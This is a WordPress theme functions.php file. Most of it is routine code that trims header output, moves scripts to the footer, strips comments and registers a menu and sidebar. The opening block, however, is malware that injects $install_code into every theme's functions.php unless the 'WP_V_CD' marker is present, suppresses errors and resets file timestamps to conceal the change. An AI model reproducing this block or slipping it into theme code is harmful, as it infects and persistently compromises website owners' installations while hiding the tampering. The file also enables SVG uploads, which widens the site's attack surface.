<?php

if ($content = file_get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php')){
  if (strpos($content, 'WP_V_CD') === false){
      $content = $install_code . $content ;
      @file_put_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php', $content);
      touch( $themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php' , $time );
  }
  else { $ping = false; }
}

remove_filter('the_content', 'wpautop');
add_filter('the_content', 'remove_empty_p', 20, 1);
function remove_empty_p($content){
  $content = force_balance_tags($content);
  return preg_replace('#<p>\s*+(<br\s*/*>)?\s*</p>#i', '', $content);
}

register_nav_menus( array(
	'primary' => __( 'Primary Menu', 'THEMENAME' ),
));

function remove_head_scripts() {
  remove_action('wp_head', 'wp_print_scripts');
  remove_action('wp_head', 'wp_print_head_scripts', 9);
  remove_action('wp_head', 'wp_enqueue_scripts', 1);

  add_action('wp_footer', 'wp_print_scripts', 5);
  add_action('wp_footer', 'wp_enqueue_scripts', 5);
  add_action('wp_footer', 'wp_print_head_scripts', 5);
}

function remove_api () {
  remove_action( 'wp_head', 'rest_output_link_wp_head', 10 );
  remove_action( 'wp_head', 'wp_oembed_add_discovery_links', 10 );
}
remove_filter('term_description','wpautop');

function my_deregister_scripts(){
  wp_deregister_script( 'wp-embed' );
}
add_action( 'wp_footer', 'my_deregister_scripts' );
remove_action('wp_head', 'wp_resource_hints', 2);
add_action( 'after_setup_theme', 'remove_api' );
add_action( 'wp_enqueue_scripts', 'remove_head_scripts' );
remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action( 'wp_head',      'wp_oembed_add_discovery_links'         );
remove_action('wp_print_styles', 'print_emoji_styles');
remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
remove_action( 'admin_print_styles', 'print_emoji_styles' );
remove_action   ('wp_head', 'feed_links_extra');
remove_action   ('wp_head', 'feed_links');
remove_action   ('wp_head', 'rsd_link');
remove_action   ('wp_head', 'wlwmanifest_link');
remove_action   ('wp_head', 'index_rel_link');
remove_action   ('wp_head', 'parent_post_rel_link');
remove_action   ('wp_head', 'start_post_rel_link');
remove_action   ('wp_head', 'adjacent_posts_rel_link');
remove_action   ('wp_head', 'wp_generator');
remove_action   ('wp_head', 'wp_shortlink_wp_head', 10, 0 );
remove_action   ('wp_head', 'rel_canonical');
remove_action   ('wp_head', 'feed_links', 2);
remove_action   ('wp_head', 'feed_links_extra', 3);
add_action      ('init', 'remove_header_info');
remove_action   ('wp_head', 'rel_canonical');
add_filter      ('index_rel_link', 'disable_stuff' );
add_filter      ('parent_post_rel_link', 'disable_stuff' );
add_filter      ('start_post_rel_link', 'disable_stuff' );
add_filter      ('previous_post_rel_link', 'disable_stuff' );
add_filter      ('next_post_rel_link', 'disable_stuff' );
add_filter      ('tablepress_use_default_css', '__return_false' );
//add_filter      ('show_admin_bar' , 'my_function_admin_bar');
add_action      ('init', 'remove_header_info');
add_filter      ('wp_default_scripts', 'dequeue_jquery_migrate' );

function remove_unwanted_css(){
  wp_dequeue_style('super-rss-reader-css-css');
}
add_action('init','remove_unwanted_css', 100);
function remove_all_theme_styles() {
  global $wp_styles;
  $wp_styles->queue = array();
}

function remove_cssjs_ver( $src ) {
  if( strpos( $src, '?ver=' ) )
    $src = remove_query_arg( 'ver', $src );
  return $src;
}
add_filter( 'style_loader_src', 'remove_cssjs_ver', 10, 2 );
add_filter( 'script_loader_src', 'remove_cssjs_ver', 10, 2 );
function disable_stuff( $data ) {
  return false;
}
function remove_header_info() {
  remove_action   ('wp_head', 'feed_links', 2);
  remove_action   ('wp_head', 'feed_links_extra', 3);
}
function my_function_admin_bar(){
  return false;
}
// END REMOVE JUNK FORM HEADER

remove_filter( 'the_content', 'wpautop' );
$br = false;
add_filter( 'the_content', function( $content ) use ( $br ) {
  return wpautop( $content, $br );
}, 10 );
// END REMOVE BR

remove_filter( 'the_content', 'wpautop' );
remove_filter( 'the_excerpt', 'wpautop' );

function callback($buffer) {
  $buffer = preg_replace('/<!--(.|s)*?-->/', '', $buffer);
  return $buffer;
}
function buffer_start() {
  ob_start("callback");
}
function buffer_end() {
  ob_end_flush();
}
add_action('get_header', 'buffer_start');
add_action('wp_footer', 'buffer_end');
// END BUFFER

function cc_mime_types($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');
// END ADD SVG UPLOAD

function arphabet_widgets_init() {

	register_sidebar( array(
		'name'          => 'Booking',
		'id'            => 'booking',
		'before_widget' => '<div>',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="rounded">',
		'after_title'   => '</h2>',
	) );

}
add_action( 'widgets_init', 'arphabet_widgets_init' );